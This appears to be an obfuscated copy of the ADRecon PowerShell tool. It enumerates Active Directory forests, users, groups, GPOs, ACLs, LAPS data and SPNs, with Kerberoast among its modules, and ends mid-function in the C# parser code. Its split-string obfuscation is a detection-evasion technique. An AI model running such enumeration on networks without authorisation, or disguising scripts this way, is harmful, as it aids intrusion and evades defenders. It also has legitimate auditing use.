 sv ('MjV'+'1H') ( [Type]("{3}{0}{2}{4}{5}{1}" -f'ySt','ItY','em.W','s','eB.HTTp','uTiL')) ;    set  TJ38q0 (  [type]("{0}{1}{2}{3}"-f'SY','ST','EM.g','c') )  ;$5YH  = [tYpE]("{3}{5}{10}{0}{7}{4}{8}{1}{6}{2}{9}" -f 'InteROp.','c','our','mIcrOSof','isTo','t.','tS','eXCeL.XlL','bje','cetYPe','OfFice.');   sV 5u4  ( [tYPE]("{11}{2}{7}{3}{10}{5}{1}{6}{8}{0}{4}{9}" -F 'nO','OP.ex','RO','OF','gUE','NTer','CEL.x','s','Lyes','ss','T.OFFicE.I','MIc')  ) ;    sET-iTEm  ('VA'+'Ria'+'BlE:EjhQ') (  [tYpe]("{2}{5}{4}{7}{3}{6}{8}{0}{1}"-f'ABLESO','uRcEtype','micROs','p.EXcel','E','Oft.OFfIc','.Xl','.InterO','pIvoTT')) ;  $Grp= [TYpe]("{9}{11}{1}{10}{8}{4}{5}{7}{6}{12}{2}{0}{3}"-F 'oNLi','osoft.oF','.XlPIvOttaBleVErSI','sT','E.i','nTE','.e','roP','c','Mi','FI','CR','XceL')  ;   $Gnh8 =  [TYPe]("{0}{1}{11}{9}{6}{10}{7}{8}{5}{4}{3}{12}{2}" -F'miCrosO','Ft','LaTIOn','lc','cA','D','cEL.x','OtfI','eL','E.INTERoP.Ex','lpiV','.OfFIc','u');  seT-vARiABLE  ('YVmjZ'+'k') (  [tYPE]("{2}{5}{1}{7}{4}{0}{8}{3}{6}" -F 'oP.E','FfIcE.I','mi','LcHARTTYP','r','cROSofT.O','E','nTE','xcEL.x')  )  ;  sV Njl ([TypE]("{3}{2}{8}{5}{4}{6}{0}{9}{1}{10}{7}"-f'n','IReCtI','Ic','m','fFice.','O','I','N','rosOFt.','terOP.eXceL.xlD','o') )  ;sEt-VaRiAble eGKQx5  ( [TyPe]("{2}{5}{1}{9}{8}{7}{3}{0}{6}{10}{4}"-F'.E','SO','MIC','ICe.INTerOp','wCOL','rO','xCe','fF','T.O','f','l.xLro') ) ;  sET-Item VARiABLE:dBj67 ( [type]("{12}{9}{10}{2}{8}{3}{13}{6}{11}{7}{1}{5}{0}{4}"-F'diTIo','.xlFORmaT','f','iCE.','nTYpE','Con','t','.eXcel','t.OFf','i','cRoso','erop','m','IN')) ;  $GJq=[tYpe]("{2}{5}{6}{7}{3}{4}{9}{0}{8}{1}"-F'p.ExceL.xlPi','n','mI','.o','Ffice','c','R','oSOft','VoTfiELDOrieNtaTiO','.InTErO') ;  SeT ("yx"+"l2") ( [tyPE]("{6}{3}{8}{2}{5}{0}{4}{1}{7}"-f 'p.EXCEL.x','de','OffICe.iNtEr','soFt','LSoRTOr','o','mICrO','R','.')); sEt-iTEM vaRiABLE:16dEmO  ( [tYPe]("{4}{0}{2}{1}{3}" -f'YsTem.dr','ag','awinG.iM','E','s')  );  $AU3  =  [tYPe]("{0}{1}" -f 'Ma','tH');  Sv  FXi4gU ([tyPE]("{1}{0}" -F 'aY','arr'))  ;  $8Zv  =[TyPe]("{3}{2}{0}{1}" -F'N','VErTeR','tco','bi');   $93nBJk = [TyPe]("{1}{0}{3}{2}"-f'STe','sY','T','M.conVer');    seT-vaRiABlE 4gqU ( [TYPE]("{2}{4}{3}{0}{1}"-f 'O','MObJeCt','s','_C','yStEM._')  ) ;sET-ITEm  ('VARIab'+'LE:A'+'4EYZ'+'p')  ([TYpe]("{0}{1}" -f 'sTR','InG') ) ;  Set-iTem  varIAblE:wm35 ( [tYPE]("{8}{1}{4}{6}{2}{9}{0}{7}{5}{3}"-f'ACTiV','ysTem.dIRe','RvIcES','Ain','CtO','recTORy.dOM','RYSe','EDI','s','.') )  ;    Set KwX9e  ( [type]("{2}{7}{11}{9}{13}{4}{14}{8}{5}{10}{0}{3}{12}{1}{6}" -f'oR','fOr','SystEm.','Y','c','VeDIre','Est','d','I','SErvIcES','CT','IRecToRy','.','.A','t') )  ;  $58A7Z=[tyPE]("{8}{3}{1}{5}{0}{7}{6}{4}{2}" -F'oRYs','Re','ks','YSTem.Di','seCUriTymaS','ct','.','eRviCes','s');   SET-iTeM variAbLE:15hlJ7  (  [tyPE]("{1}{0}{4}{6}{2}{5}{3}" -f 't','sys','dInG.T','EAD','Em.Thr','hr','Ea'))  ;   $o5f7et =[TYPE]("{2}{1}{0}"-F'PTr','NT','i')  ;$HLxC = [tyPe]("{5}{2}{3}{6}{4}{0}{1}"-F'RVI','CEs.MarsHAL','Em.RUNtim','e.Int','OPSe','SYst','Er'); $ah1= [tYpe]("{4}{1}{0}{3}{2}" -F 'ecTiOn','eFL','SEmBly','.AS','R') ;  seT-ItEm  VariABLe:jcz  ([TYpe]("{0}{1}{5}{2}{3}{4}"-F's','ysTEM.bit','n','VEr','Ter','cO')  ) ;   set ("A"+"QlNX") ([TYPe]("{2}{1}{0}"-f 'ERt','OnV','c')) ;   sV obr  (  [typE]("{3}{0}{1}{2}"-f'ECoN.A','dwSC','Lass','adr')  ); SEt  pS9J5D (  [tYpE]("{5}{6}{2}{4}{0}{3}{7}{1}"-F 'M.Di','OPwAtCh','St','agNosTI','e','S','y','cs.St'))  ;   SET-iTem ("Va"+"RIA"+"ble:3y9")  ([TYPe]("{0}{3}{1}{2}" -f'AdRECo','lDApcLa','SS','n.'))  ;   $yedF=  [TYPe]("{0}{1}{2}"-F'ENv','iRONmE','Nt')  ;  sEt-ITEM  ("VarIAB"+"l"+"e:lePX")  ([TyPe]("{0}{4}{3}{1}{2}" -f 'SYstEM.R','AsSE','mBLY','n.','EflEcTIO'))  ;  SV  ('Q'+'3'+'cUVM')  ( [tyPE]("{1}{5}{4}{6}{2}{0}{3}" -f '.PSCredENti','mANA','N','AL','mEnT.aUto','Ge','mATio') )  ; 

[CmdletBinding()]
param
(
    [Parameter(mAnDatoRy = $false, HELPMESSAGe = {"{7}{3}{6}{1}{4}{0}{5}{8}{2}" -f'(d','DWS',', LDAP','ich meth',' ','e','od to use; A','Wh','fault)'})]
    [ValidateSet({"{0}{1}"-f 'ADW','S'}, {"{1}{0}" -f'P','LDA'})]
    [string] $Method = ("{1}{0}" -f'WS','AD'),

    [Parameter(ManDATory = $false, HeLpMesSaGE = {"{4}{6}{1}{3}{2}{7}{0}{5}"-f'D','P','or ',' Address ','Domain Controll','N.','er I','Domain FQ'})]
    [string] $DomainController = '',

    [Parameter(ManDaToRy = $false, HElpMesSAgE = {"{2}{0}{1}{3}" -f'm','ain Credent','Do','ials.'})]
    [Management.Automation.PSCredential] $Credential =   (GCI  ("VA"+"rI"+"aBlE:Q3c"+"UVm")).vaLuE::"EM`PtY",

    [Parameter(MANdATory = $false, HELPMessAgE = {"{35}{6}{8}{1}{5}{29}{16}{14}{27}{17}{34}{3}{37}{15}{20}{30}{18}{4}{22}{31}{11}{2}{10}{33}{19}{25}{23}{0}{7}{24}{12}{28}{26}{32}{36}{13}{9}{21}"-f 'crosoft Exce','r ','nerate th','S','x.','ADRecon outpu',' ','l ','fo','Re','e ADRe',' ge','ot','n AD','contain','DRe','r ',' the ','rt.xls','ort.xlsx','con-Re','con.',' Use i','when Mi','is n',' ',' on','ing',' installed','t folde','po','t to',' the host used to ','con-Rep','C','Path','ru','V files to generate the A'})]
    [string] $GenExcel,

    [Parameter(MANDaTOrY = $false, HElpMesSaGe = {(("{24}{1}{28}{19}{27}{29}{37}{0}{43}{9}{44}{26}{34}{23}{15}{38}{3}{17}{25}{13}{42}{20}{5}{10}{32}{4}{7}{39}{2}{36}{14}{12}{40}{8}{18}{35}{21}{41}{6}{11}{16}{30}{33}{22}{31}" -f 'u','th',' ','N/HTML file','lsx. (The','-Repor','if ',' fold','e','folder to','t.','i','e','e','p','/','t','s and ','d ','for ADR','n','l be ','2kt exi','ML','Pa','the ADR','the CSV','ec',' ','on',' doe','st)','x','snQ','/X','wil','s',' o','JSO','er','cifi','created ','co','tput ',' save '))-rEplAce 'Q2k',[chAR]39})]
    [string] $OutputDir,

    [Parameter(mANdAToRy = $false, HELpMesSAGe = {("{32}{4}{48}{49}{9}{24}{89}{37}{41}{52}{92}{93}{30}{86}{76}{100}{5}{64}{6}{26}{88}{84}{90}{46}{0}{56}{95}{73}{78}{51}{11}{45}{7}{40}{61}{69}{1}{59}{55}{21}{82}{13}{36}{53}{28}{25}{20}{3}{71}{81}{14}{72}{58}{70}{62}{91}{94}{79}{67}{99}{97}{15}{2}{27}{98}{87}{29}{17}{60}{63}{54}{68}{22}{23}{47}{80}{18}{77}{44}{38}{65}{16}{12}{75}{10}{74}{33}{85}{19}{57}{39}{43}{31}{83}{96}{8}{66}{50}{35}{42}{34}"-f'ues i','ubnets, Sche','ps,','nt','e','t','usedforServ',', S','omainAccou','un','s, LAP',', ','ute','F','r','Grou',', Comp','O','ecor','cker, ACLs, ','o','sword',',',' DNS','; Comma sep','nC','i',' ','wordPolicy, Domai','ers, ','ACLs','r','Which modul',', ','Logon','ervic','ineGra','ores','ers, Com','rt','it','t','e',', Kerbe','s, Print','Trusts','lid val','Zones, D','s to',' r','sedforS','ain',',Dom','inedPass','GPOs, gPLin','story, Pas','nclude: ','GPORepo','s','maHi','U','es, ','r','s, ','s','puters','ntsu','PasswordAttribu','ks','S','e','rollers, ','s, U','st,','S','rSPN','inAcco','d',' Dom','s, ','NSR','Use','Policy, ','oa','gon)','BitLo',', Kerberoast and Doma','s, GroupMemb','ceLo','arated; e.g F',' Va','S','ain (Default al','l except ','PN','Fore','st, D','es, ','GroupChange','t','un')})]
    [ValidateSet({"{0}{1}"-f 'For','est'}, {"{1}{0}" -f'ain','Dom'}, {"{2}{1}{0}" -f 's','t','Trus'}, {"{0}{1}" -f'Sit','es'}, {"{0}{1}" -f 'Sub','nets'}, {"{0}{1}{3}{2}"-f 'S','chem','istory','aH'}, {"{4}{1}{3}{2}{0}" -f'icy','asswor','Pol','d','P'}, {"{3}{5}{1}{2}{4}{0}"-f'olicy','ainedP','assword','F','P','ineGr'}, {"{3}{1}{0}{4}{2}"-f'Co','in','rollers','Doma','nt'}, {"{1}{0}" -f 'rs','Use'}, {"{0}{2}{1}" -f'User','s','SPN'}, {"{3}{2}{0}{1}"-f'ttri','butes','rdA','Passwo'}, {"{0}{1}" -f 'Grou','ps'}, {"{3}{0}{1}{2}"-f 'C','han','ges','Group'}, {"{1}{3}{2}{0}"-f'bers','G','upMem','ro'}, 'OUs', {"{1}{0}" -f's','GPO'}, {"{1}{0}" -f'inks','gPL'}, {"{2}{0}{1}" -f'ne','s','DNSZo'}, {"{2}{1}{3}{0}"-f's','N','D','SRecord'}, {"{2}{0}{1}"-f'te','rs','Prin'}, {"{1}{0}{2}{3}"-f'mp','Co','ut','ers'}, {"{0}{3}{2}{1}"-f'C','s','PN','omputerS'}, {"{0}{1}"-f 'LAP','S'}, {"{2}{1}{0}{3}"-f 'cke','Lo','Bit','r'}, {"{0}{1}" -f'ACL','s'}, {"{0}{1}{2}" -f'GP','ORepo','rt'}, {"{2}{1}{0}"-f 'rberoast','e','K'}, {"{2}{1}{7}{0}{6}{3}{5}{4}"-f 'ntsusedf','ainAc','Dom','rServiceLo','n','go','o','cou'}, {"{0}{2}{1}"-f 'Def','lt','au'})]
    [array] $Collect = ("{0}{1}{2}" -f 'Def','au','lt'),

    [Parameter(manDAtOry = $false, HElpMeSsaGE = {("{19}{24}{8}{5}{27}{35}{32}{9}{7}{23}{14}{15}{36}{0}{20}{33}{13}{3}{12}{11}{26}{16}{34}{4}{28}{17}{22}{2}{21}{18}{31}{6}{29}{30}{1}{25}{10}"-f 'DOUT','S',',','SON,HT','D',' ','se','ed','type;','at','Excel)','xce','ML,E','J','g',' S','fau','with -Collect par','e','Outpu',',',' ','ameter','; e.','t ','V and ','l (De','Comma','OUT ',' ','C','l','seper','CSV,XML,','lt ST',' ','T')})]
    [ValidateSet({"{1}{2}{0}"-f 'T','STD','OU'}, 'CSV', 'XML', {"{1}{0}"-f'SON','J'}, {"{0}{1}" -f'E','XCEL'}, {"{0}{1}"-f'H','TML'}, 'All', {"{0}{2}{1}"-f 'Defa','t','ul'})]
    [array] $OutputType = {"{0}{1}{2}" -f 'De','fau','lt'},

    [Parameter(MaNdAtorY = $false, hElpMessagE = {"{1}{7}{2}{4}{9}{6}{11}{3}{0}{8}{5}{10}"-f '. De','Times','o','s','r Dorma','0 da','cou','pan f','fault 9','nt ac','ys','nt'})]
    [ValidateRange(1,1000)]
    [int] $DormantTimeSpan = 90,

    [Parameter(maNDatoRy = $false, HELpmEssAGE = {"{15}{0}{11}{14}{6}{5}{12}{9}{10}{13}{7}{1}{2}{8}{3}{4}"-f'x','e','fau','3','0 days','cou','hine ac','D','lt ','as','s','imum','nt p','word age. ',' mac','Ma'})]
    [ValidateRange(1,1000)]
    [int] $PassMaxAge = 30,

    [Parameter(manDatoRy = $false, heLPMesSaGe = {"{7}{6}{5}{8}{10}{3}{1}{11}{9}{0}{2}{4}"-f'Default ','rc','20',' LDAP sea','0',' PageSi','e','Th','ze to set for ','t. ','the','her objec'})]
    [ValidateRange(1,10000)]
    [int] $PageSize = 200,

    [Parameter(MaNDAtORY = $false, HELPMeSsAge = {"{8}{10}{7}{11}{6}{12}{9}{1}{2}{0}{4}{3}{5}"-f 'ing of o',' during proc','ess','s. Default','bject',' 10',' of','e','The num','s to use','b','r',' thread'})]
    [ValidateRange(1,100)]
    [int] $Threads = 10,

    [Parameter(MAnDAtoRy = $false, HelPMESsAGe = {"{3}{7}{9}{1}{5}{8}{2}{0}{4}{6}"-f'ing Star','co','Log us','Creat','t-Transcr','n','ipt','e ADR',' ','e'})]
    [switch] $Log
)

$ADWSSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members["OperatingSystem"].Value != null ? AdDC.Members["OperatingSystem"].Value : "-") + " " + AdDC.Members["OperatingSystemHotfix"].Value + " " + AdDC.Members["OperatingSystemServicePack"].Value + " " + AdDC.Members["OperatingSystemVersion"].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members["OperationMasterRoles"].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case "InfrastructureMaster":
                            Infra = true;
                            break;
                            case "DomainNamingMaster":
                            Naming = true;
                            break;
                            case "SchemaMaster":
                            Schema = true;
                            break;
                            case "RIDMaster":
                            RID = true;
                            break;
                            case "PDCEmulator":
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", AdDC.Members["Domain"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Site", AdDC.Members["Site"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Name", AdDC.Members["Name"].Value));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.Members["IPv4Address"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Members["HostName"].Value));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.Members["IPv4Address"].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members["IPv4Address"].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Members["ObjectClass"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Members["Name"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Members["whenCreated"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Members["whenChanged"].Value));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Members["DistinguishedName"].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
